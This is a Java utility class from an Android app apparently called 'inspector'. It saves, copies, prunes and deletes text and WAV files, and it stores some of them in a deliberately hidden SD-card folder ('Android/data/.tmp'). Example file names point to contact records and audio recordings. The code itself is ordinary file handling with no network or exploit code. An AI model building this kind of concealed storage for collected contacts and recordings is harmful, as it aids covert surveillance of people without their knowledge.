package com.particle.inspector.common.util;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.channels.FileChannel;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.Date;
import java.util.List;

import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.Environment;
import android.util.Log;

import com.particle.inspector.common.util.DeviceProperty;

/**
 * File I/O control <-> SD-Card
*/
public class FileCtrl 
{
	// In Android, a folder with name starts with '.' is hidden.
	public static final String DEFAULT_FOLDER_P1 = "Android";
	public static final String DEFAULT_FOLDER_P2 = "Android/data";
	public static final String DEFAULT_FOLDER = "Android/data/.tmp";
	
	public static final String SUFFIX_TXT = ".txt";
	public static final String SUFFIX_WAV = ".wav";

	private static final String LOGTAG = "FileCtrl";
	
	// ----------------------------------------------------------------------------------
	// Functions for internal storage
	// ----------------------------------------------------------------------------------
	
	// Get the string of files folder of current app in internal storage
	public static String getInternalStorageFilesDirStr(Context context) {
		String path = context.getApplicationContext().getFilesDir().getAbsolutePath() + "/";
		return path;
	}

	public static File getInternalStorageFilesDir(Context context) {
		return new File(getInternalStorageFilesDirStr(context));
	}
	
	/**
	 * Save file to internal storage. If the file exists, overwrite it. 
	 * @param fullname the fullname of the file, e.g. .info/contact_2011-01-01.txt, .recording/Recording_2011-01-01.wav
	 */
	public static File Save2InternalStorage(Context context, String fullname, String content) throws Exception
	{
		File file = null;
		
		file = new File(getInternalStorageFilesDirStr(context) + "/" + fullname);
		if (file.exists()) file.delete();
		file.createNewFile();
		FileOutputStream fos = new FileOutputStream(file);
		fos.write(content.getBytes());
		fos.close();
		
		return file;
	}
	
	// ----------------------------------------------------------------------------------
	// Functions for SD-CARD
	// ----------------------------------------------------------------------------------
	
	public static String getDefaultSDDirStr() {
		return getSDCardRootPath() + "/" + DEFAULT_FOLDER + "/";
	}	

	public static File getDefaultSDDir() {
		return new File(getDefaultSDDirStr());
	}
	
	// The root dir of the default dir  
	public static File getDefaultSDDirP1() {
		return new File(getSDCardRootPath() + "/" + DEFAULT_FOLDER_P1 + "/");
	}
	
	// The parent dir of the default dir
	public static File getDefaultSDDirP2() {
		return new File(getSDCardRootPath() + "/" + DEFAULT_FOLDER_P2 + "/");
	}
	
	/**
	 * Save file to SD-CARD. If the file exists, overwrite it. 
	 * @param fullname the fullname of the file, e.g. /sdcard/Android/data/.tmp/contact_2011-01-01.txt
	 */
	public static File Save2SDCard(String fullname, String content) throws Exception
	{
		File file = null;
		
		if (isSDCardReady())
		{
			file = new File(getSDCardRootPath() + "/" + fullname);
			if (file.exists()) file.delete();
			file.createNewFile();
			FileOutputStream fos = new FileOutputStream(file);
			fos.write(content.getBytes());
			fos.close();
		}
		
		return file;
	}
	
	public static File Save2DefaultDirInSDCard(String name, String content) throws Exception
	{
		File file = null;
		
		if (isSDCardReady())
		{
			file = new File(getSDCardRootPath() + "/" + DEFAULT_FOLDER + "/" + name);
			if (file.exists()) file.delete();
			file.createNewFile();
			FileOutputStream fos = new FileOutputStream(file);
			fos.write(content.getBytes());
			fos.close();
		}
		
		return file;
	}
	
	public static void copy2DefaultDirInSDCard(File file) throws Exception
	{
		if (file == null) return;
		
		if (isSDCardReady())
		{
			File dstFile = new File(getSDCardRootPath() + "/" + DEFAULT_FOLDER + "/" + file.getName());
			copyFile(file, dstFile);
		}
	}
	
	public static boolean isSDCardReady()
	{
		return Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED); 
	}
	
	public static String getSDCardRootPath()
	{
		File sdCardRoot = Environment.getExternalStorageDirectory();
		return sdCardRoot.getPath();  
	}

	public static File creatSDDir(String dirName)
	{  
        File dir = new File(getSDCardRootPath() + "/" + dirName);  
        dir.mkdir();  
        return dir;  
    }
	
	public static File createDefaultSDDir()
	{  
		File dirP1 = getDefaultSDDirP1();
		File dirP2 = getDefaultSDDirP2();
        File dir = getDefaultSDDir();
        try {
        	if (!dirP1.exists()) dirP1.mkdir();
        	if (!dirP2.exists()) dirP2.mkdir();
        	if (!dir.exists()) dir.mkdir();
        } catch (Exception ex) {}
        return dir;  
    }
	
	public static boolean doesSDDirExist(String dirName)
	{  
        File dir = new File(getSDCardRootPath() + "/" + dirName);
        return dir.exists();
    }
	
	public static boolean defaultSDDirExist()
	{  
        return getDefaultSDDir().exists();
    }
	
	public static void removeDefaultSDDir() {
		File dir = getDefaultSDDir();
		if (dir.exists()) {
			try {
				dir.delete();
			} catch (Exception ex) {}
		}
	}
	
	// ----------------------------------------------------------------------------------
	// Functions for operating info files and recording files
	// ----------------------------------------------------------------------------------
	
	public static void cleanTxtFiles(Context context) 
	{
		//File dir = getDefaultSDDir();
		File dir = getInternalStorageFilesDir(context);
		if (dir.exists() && dir.isDirectory()) 
		{
			File[] files = dir.listFiles();
			for (int i = 0; i < files.length; i++)
			{
				if (files[i].isFile() && files[i].getName().endsWith(SUFFIX_TXT)) 
				{
					try {
						files[i].delete();
					}
					catch (Exception ex)
					{
						//Log.e(LOGTAG, ex == null ? "Cannot delete file <" + files[i].getName() + ">" : ex.toString());
					}
				}
			}
			
			/*
			// Try to remove the directory
			if (dir.listFiles().length == 0) {
				try {
					dir.delete();
				} catch (SecurityException e) {
					//Log.e(LOGTAG, e.toString());
				}
			}
			*/
		}
	}
	
	public static void cleanWavFiles(List<File> wavs) 
	{
		try {
			for (File wav : wavs) {
				if (wav.exists()) {
					wav.delete();
				}
			}
		} catch (Exception ex) {
		}
	}
	
	// Remove redundant wav files according to time order: keep recent files in a limited number
	public static void reduceWavFiles(Context context, int numLimit) 
	{
		List<File> wavs = FileCtrl.getAllWavFiles(context);
		int wavCount = wavs.size();
		if (wavCount <= numLimit) return;
		
		// Remove old redundant files by time order
		wavs = FileCtrl.sortFileByTimeOrder(wavs);
		try {
			for (int i = 0; i < (wavCount - numLimit); i++) {
				wavs.get(i).delete();
			}
		} catch (Exception ex) {
		}
	}
	
	// Remove all files in inspector internal storage
	public static void removeAllFiles(Context context) 
	{
		try {
			File dir = FileCtrl.getInternalStorageFilesDir(context);
			if (!dir.exists() || !dir.isDirectory()) return;
			
			File[] files = dir.listFiles();
			for (File file : files) {
				file.delete();
			}
		} catch (Exception e) {
		}
	}
	
	public static List<File> getAllWavFiles(Context context) {
		List<File> wavs = new ArrayList<File>();
		try {
			File dir = FileCtrl.getInternalStorageFilesDir(context);
			if (!dir.exists() || !dir.isDirectory()) return wavs;
			
			File[] files = dir.listFiles();
			String name;
			for (File file : files) {
				name = file.getName();
				if (file.isFile() && name.endsWith(FileCtrl.SUFFIX_WAV))
				{
					wavs.add(file);
				}
			}
		} catch (Exception e) {
			Log.e(LOGTAG, e.getMessage());
		}
		return wavs;
	}
	
	@SuppressWarnings("unchecked")
	public static List<File> sortFileByTimeOrder(List<File> files) 
	{
		 Collections.sort(files, new FileCompareUtil.CompratorByLastModified());
		 return files;
	}
	
	public static void copyFile(File src, File dst) throws IOException 
	{
	      FileChannel inChannel = new FileInputStream(src).getChannel();
	      FileChannel outChannel = new FileOutputStream(dst).getChannel();
	      try {
	         inChannel.transferTo(0, inChannel.size(), outChannel);
	      } finally {
	         if (inChannel != null) {
	            inChannel.close();
	         }
	         if (outChannel != null) {
	            outChannel.close();
	         }
	      }
	}

}